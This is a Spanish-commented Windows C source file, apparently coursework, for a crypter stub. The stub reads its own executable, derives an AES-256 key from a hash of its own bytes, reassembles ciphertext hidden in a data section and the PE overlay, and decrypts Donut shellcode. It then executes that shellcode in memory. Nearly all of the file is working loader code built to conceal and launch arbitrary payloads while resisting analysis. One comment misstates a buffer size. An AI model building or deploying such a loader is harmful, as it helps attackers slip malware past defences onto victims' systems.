/*
 * Cyber Cripter — testing stub (educational coursework).
 *
 * Este binario es la plantilla pre-compilada del loader que el builder C# parchea.
 * El layout en disco, tras el parcheo, es:
 *
 *   Sección .cdata (datos const inicializados, mapeados solo-lectura en runtime):
 *     g_meta        — StubMetadata (heap_marker, timestamp, IV, tamaños,
 *                      hash_region_size). Localizado via METADATA_MAGIC.
 *     g_half1_buf   — buffer prefijado con magic que contiene la primera mitad
 *                      del ciphertext. Localizado via HALF1_MAGIC. Capacidad HALF1_MAX bytes.
 *
 *   PE overlay (bytes en bruto tras la última sección del PE):
 *     segunda mitad del ciphertext — half2 (tamaño en g_meta.half2_size).
 *
 * Flujo en runtime:
 *   1. Leer el propio fichero desde disco.
 *   2. Re-derivar la clave AES-256:
 *         clave = SHA256( heap_marker || self_bytes[0..hash_region] || timestamp )
 *      Los bytes del stub en el hash actúan como anti-tamper: cualquier modificación
 *      del prefijo hasheado invalida la clave y el descifrado falla.
 *   3. Remontar el ciphertext completo = half1 || half2.
 *   4. Descifrar con AES-256-CBC con padding PKCS#7 -> shellcode (salida de Donut).
 *   5. Ejecutar payload en memoria.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <winternl.h>
#include <bcrypt.h>

#include <stdio.h>
#include <io.h>
#include <fcntl.h>

#pragma comment(lib, "bcrypt.lib")

/* Capacidad máxima del buffer embebido en .cdata para la primera mitad del ciphertext (1 MiB).
   Debe coincidir con HALF1_MAX en StubBuilder.cs del builder C#. */
#define HALF1_MAX 0x7D000

/* Layout de los metadatos que el builder escribe en .cdata.
   Idéntico al de stub_EarlyBirdAPC.c . */
#pragma pack(push, 1)
typedef struct {
    unsigned char      magic[16];
    unsigned char      heap_marker[8];
    unsigned long long timestamp;
    unsigned char      iv[16];
    unsigned int       half1_size;
    unsigned int       half2_size;
    unsigned int       hash_region_size;
} StubMetadata;
#pragma pack(pop)

#pragma section(".cdata", read)

// Se crea StubMetadata dentro de .cdata
__declspec(allocate(".cdata"))
volatile const StubMetadata g_meta = {
    /* magic            */ { 'M','E','T','A','!','C','R','Y','p','T','e','R','!',
                              0xAA, 0xBB, 0xCC },
    /* heap_marker      */ { 0, 0, 0, 0, 0, 0, 0, 0 },
    /* timestamp        */ 0,
    /* iv               */ { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 },
    /* half1_size       */ 0,
    /* half2_size       */ 0,
    /* hash_region_size */ 0
};

// Se crea buffer de datos dentro de .cdata de (16 + HALF1_MAX) Bytes
__declspec(allocate(".cdata"))
volatile const unsigned char g_half1_buf[16 + HALF1_MAX] = {
    'H','A','L','F','!','O','N','E','!','D','A','T','A', 0xDD, 0xEE, 0xFF
};


/* ---------- helpers mínimos (sin dependencia del CRT) ---------- */

/**
 * @brief  Reserva n bytes en el heap del proceso. Sustituto de malloc sin CRT.
 * @param[in]  n  Número de bytes a reservar.
 * @return Puntero al bloque reservado, o NULL si falla la asignación.
 */
static void *xalloc(SIZE_T n) { return HeapAlloc(GetProcessHeap(), 0, n); }

/**
 * @brief  Libera un bloque previamente reservado con xalloc. No hace nada si p es NULL.
 * @param[in]  p  Puntero al bloque a liberar (puede ser NULL).
 */
static void  xfree(void *p)   { if (p) HeapFree(GetProcessHeap(), 0, p); }

/**
 * @brief  Copia n bytes de src a dst. Sustituto de memcpy sin CRT.
 * @param[out] dst  Buffer de destino; debe tener al menos n bytes disponibles.
 * @param[in]  src  Buffer de origen.
 * @param[in]  n    Número de bytes a copiar.
 */
static void xcopy(void *dst, const volatile void *src, SIZE_T n)
{
    unsigned char *d = (unsigned char *)dst;
    const volatile unsigned char *s = (const volatile unsigned char *)src;
    while (n--) *d++ = *s++;
}

/**
 * @brief  Sobreescribe n bytes de p con ceros. Sustituto de memset seguro sin CRT.
 *         volatile impide al compilador eliminar el bucle como "código muerto".
 * @param[in,out] p  Buffer a borrar.
 * @param[in]     n  Número de bytes a poner a cero.
 */
static void xzero(void *p, SIZE_T n)
{
    volatile unsigned char *d = (volatile unsigned char *)p;
    while (n--) *d++ = 0;
}

/* ---------- lectura del propio fichero desde disco ---------- */

/**
 * @brief  Lee el binario del stub completo desde disco. Necesario para hashear
 *         el prefijo en la derivación de clave y para acceder al overlay (half2).
 * @param[out] out       Buffer reservado con el contenido del fichero (xfree() para liberar).
 * @param[out] out_size  Tamaño del fichero leído en bytes.
 * @return 1 si la lectura fue correcta, 0 en caso de error.
 */
static int read_self(unsigned char **out, DWORD *out_size)
{
    char path[MAX_PATH];
    DWORD pl = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (pl == 0 || pl >= MAX_PATH) return 0;

    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;

    LARGE_INTEGER fs;
    if (!GetFileSizeEx(h, &fs) || fs.QuadPart > 0x10000000) {
        CloseHandle(h); return 0;
    }
    DWORD size = (DWORD)fs.QuadPart;
    unsigned char *buf = (unsigned char *)xalloc(size);
    if (!buf) { CloseHandle(h); return 0; }

    DWORD got = 0;
    if (!ReadFile(h, buf, size, &got, NULL) || got != size) {
        xfree(buf); CloseHandle(h); return 0;
    }
    CloseHandle(h);
    *out = buf; *out_size = size;
    return 1;
}

/* ---------- SHA-256 via CNG ---------- */

/**
 * @brief  Calcula SHA-256 sobre un buffer usando la API CNG (BCrypt).
 * @param[in]  in      Buffer de entrada.
 * @param[in]  in_len  Longitud del buffer en bytes.
 * @param[out] out     Array de 32 bytes donde se escribe el digest.
 * @return 1 si éxito, 0 si CNG devolvió error.
 */
static int cng_sha256(const unsigned char *in, DWORD in_len, unsigned char out[32])
{
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    int ok = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return 0;
    if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) goto end;
    if (BCryptHashData(hHash, (PUCHAR)in, in_len, 0) != 0)        goto end;
    if (BCryptFinishHash(hHash, out, 32, 0) != 0)                 goto end;
    ok = 1;
end:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ---------- descifrado AES-256-CBC con padding PKCS#7 via CNG ---------- */

/**
 * @brief  Descifra un buffer con AES-256-CBC (padding PKCS#7) usando BCrypt.
 *         Dos llamadas a BCryptDecrypt: una para tamaño, otra para descifrado.
 *         El IV se restaura entre ambas porque BCryptDecrypt lo muta.
 * @param[in]  key      Clave AES de 32 bytes derivada por SHA-256.
 * @param[in]  iv_in    IV de 16 bytes (copia interna, no se modifica).
 * @param[in]  ct       Buffer con el ciphertext.
 * @param[in]  ct_len   Longitud del ciphertext (múltiplo de 16).
 * @param[out] out      Plaintext descifrado (xfree() para liberar).
 * @param[out] out_len  Longitud del plaintext tras eliminar el padding.
 * @return 1 si éxito, 0 si error.
 */
static int cng_aes256cbc_decrypt(const unsigned char key[32],
                                 const unsigned char iv_in[16],
                                 const unsigned char *ct, DWORD ct_len,
                                 unsigned char **out, DWORD *out_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    unsigned char iv[16];
    unsigned char *pt = NULL;
    DWORD plen = 0;
    int ok = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return 0;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto end;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                   (PUCHAR)key, 32, 0) != 0) goto end;

    xcopy(iv, iv_in, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL, iv, 16,
                      NULL, 0, &plen, BCRYPT_BLOCK_PADDING) != 0) goto end;
    pt = (unsigned char *)xalloc(plen);
    if (!pt) goto end;

    xcopy(iv, iv_in, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL, iv, 16,
                      pt, plen, &plen, BCRYPT_BLOCK_PADDING) != 0) {
        xfree(pt); pt = NULL; goto end;
    }
    *out = pt; *out_len = plen;
    ok = 1;
end:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}


/* Ejecuta shellcode directamente en el proceso actual */
static int execute_shellcode(const unsigned char *sc, SIZE_T sc_len) {
    LPVOID mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    if (!mem) {
        printf("[-] Error: VirtualAlloc failed. GetLastError() = %lu\n", GetLastError());
        return 0;
    }

    if (!WriteProcessMemory(GetCurrentProcess(), mem, sc, sc_len, NULL)) {
        printf("[-] Error: WriteProcessMemory failed. GetLastError() = %lu\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 0;
    }

    printf("[+] Shellcode copiado correctamente.\n");

    // Ejecutar el shellcode
    typedef void (*shellcode_func)();
    shellcode_func func = (shellcode_func)mem;
    printf("[+] About to execute shellcode at %p\n", func);
    func();
    printf("[+] Shellcode returned successfully.\n");

    // Limpiar
    printf("[+] Zeroing allocated memory...\n");
    xzero(mem, sc_len);
    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[+] execute_shellcode() completed successfully.\n");
    return 1;
}

/* ----------DEBUG---------*/
static void init_console(void)
{
    if (!AttachConsole(ATTACH_PARENT_PROCESS))
        AllocConsole();

    FILE *fp;

    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);
    freopen_s(&fp, "CONIN$",  "r", stdin);

    SetConsoleOutputCP(CP_UTF8);
}


/* --------MAIN-------- */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    // UNCOMMENT THIS LINE FOR DEBUGGING
    init_console();

    printf("[+] Stub iniciado.\n");

    /* Paso 1: leer el propio binario desde disco */
    unsigned char *self = NULL;
    DWORD self_size = 0;
    if (!read_self(&self, &self_size)) {
        printf("[-] Error: No se pudo leer el binario desde disco.\n");
        return 1;
    }
    

    DWORD hr = g_meta.hash_region_size;
    DWORD h1 = g_meta.half1_size;
    DWORD h2 = g_meta.half2_size;

    if (hr == 0 || hr > self_size || h1 > HALF1_MAX || h2 > self_size || (h1 + h2) < h1) {
        printf("[-] Error: Datos de metadatos inválidos (hash_region_size=%u, half1_size=%u, half2_size=%u, self_size=%u)\n",
               hr, h1, h2, self_size);
        xfree(self); 
        return 2;
    }

    printf("[+] 1. Binario leido desde el disco.\n");

    /* Paso 2: derivar la clave AES = SHA256(heap_marker || self[0..hr] || timestamp) */
        DWORD hin_len = 8 + hr + 8;
    unsigned char *hin = (unsigned char *)xalloc(hin_len);
    if (!hin) { 
        printf("[-] Error: No se pudo asignar memoria para hin.\n");
        xfree(self); 
        return 3; 
    }

    xcopy(hin,            g_meta.heap_marker, 8);
    xcopy(hin + 8,        self, hr);
    xcopy(hin + 8 + hr,   (const volatile unsigned char *)&g_meta.timestamp, 8);
        // const volatile unsigned char *p =
        //     (const volatile unsigned char *)&g_meta.timestamp;

        // printf("[+] timestamp bytes:\n");
        // for (int i = 0; i < 8; i++)
        //     printf("%02X ", p[i]);
        // printf("\n");

        // xcopy(hin,            p, 8);


    // DEBUG: Mostrar valores input clave
        /* Mostrar heap_marker */
        printf("[+] Heap marker: ");
        for (int i = 0; i < 8; i++)
            printf("%02X", g_meta.heap_marker[i]);
        printf("\n");

        /* Mostrar timestamp */
        printf("[+] Timestamp: %llu (0x%016llX)\n",
            g_meta.timestamp,
            g_meta.timestamp);

        

        /* Mostrar hash de los primeros hr bytes de self */
        unsigned char hash[32];
        cng_sha256(self, hr, hash);
        printf("[+] SHA-256(self): ");
        for (int i = 0; i < 32; i++)
            printf("%02X", hash[i]);
        printf("\n");

        /* DEBUG: Mostrar contenido de hin */

        printf("[+] hin (%u bytes):\n", hin_len);
        for (DWORD i = 0; i < hin_len; i++) {
            printf("%02X", hin[i]);

            /* Espacio cada 16 bytes para mejorar la legibilidad */
            if ((i + 1) % 16 == 0)
                printf("\n");
            else
                printf(" ");
        }

        if (hin_len % 16 != 0)
            printf("\n");


    unsigned char key[32];
    int ok = cng_sha256(hin, hin_len, key);
    xzero(hin, hin_len); xfree(hin);
    if (!ok) { 
        printf("[-] Error: Falló el cálculo de SHA256 para la clave.\n");
        xfree(self); 
        return 4; 
    }

    printf("[+] 2. Clave leida desde el disco: \n");
    for (int i = 0; i < 32; i++) printf("%02X", key[i]);
    printf("\n");

    /* Paso 3: remontar el ciphertext completo = half1 (en .cdata) || half2 (overlay) */
    DWORD ct_len = h1 + h2;
    unsigned char *ct = (unsigned char *)xalloc(ct_len);
    if (!ct) { 
        printf("[-] Error: No se pudo asignar memoria para el ciphertext.\n");
        xzero(key, 32); 
        xfree(self); 
        return 5; 
    }
    xcopy(ct,        g_half1_buf + 16, h1);
    xcopy(ct + h1,   self + (self_size - h2), h2);
    xfree(self);
    printf("[+] 3. Ciphertext reconstruido.\n");

    /* Paso 4: descifrar AES-256-CBC -> shellcode Donut */
    unsigned char iv[16];
    xcopy(iv, g_meta.iv, 16);

    unsigned char *sc = NULL;
    DWORD sc_len = 0;
    ok = cng_aes256cbc_decrypt(key, iv, ct, ct_len, &sc, &sc_len);
    xzero(key, 32); xzero(iv, 16); xzero(ct, ct_len); xfree(ct);
    if (!ok) {
        printf("[-] Error: Falló el descifrado AES-256-CBC.\n");
        return 6;
    }

    printf("[+] 4. Descifrado del código completado.\n");


    // Ejecutar el shellcode
    if (!execute_shellcode(sc, sc_len)) {
        printf("[-] Error: Falló la ejecución del shellcode.\n");
        //MessageBoxA(NULL, "Error ejecutando shellcode", "Error", MB_ICONERROR);
        return 7;
    }

    printf("[+] 5. Ejecución de código completada.\n");

    return 0;
}